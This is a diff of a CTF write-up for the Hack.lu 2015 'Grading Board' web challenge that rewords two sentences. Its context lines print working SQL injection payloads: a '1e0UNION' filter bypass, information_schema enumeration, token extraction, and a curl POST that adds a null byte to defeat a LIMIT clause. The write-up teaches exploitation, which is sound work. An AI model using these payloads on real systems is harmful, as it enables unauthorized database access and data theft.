@@ -55,7 +55,7 @@ AND 1=1e0UNION SELECT table_schema, table_name, column_name FROM information_sch
 ![github](https://github.com/st9140927/writeup/blob/master/Hack.lu CTF 2015/Grading Board [web] 300/5.png)<br>
 The table name and column name were there!<br>
 
-And then we entered following input:
+And then I tried the following input:
 <pre><code>
 AND 1=1e0UNION SELECT 1, 2, token FROM t608f2cde509866e#\
 </code></pre>
@@ -67,7 +67,7 @@ After summiting the token, I got the flag. :)<br>
 
 <br>
 Note:<br>
-It's also able to bypass the limit of "LIMIT 5" by using null byte. We can modify our input as following and use curl to send our post request:
+It's also possible to bypass the limit of "LIMIT 5" by using null byte. We can modify our input as following and use curl to send our post request:
 <pre><code>
 curl -X POST --data "name=AND 1=1e0union select table_schema, table_name, column_name FROM information_schema.columns;%00\&site=default&action=search" https://school.fluxfingers.net:1506/
 </code></pre>
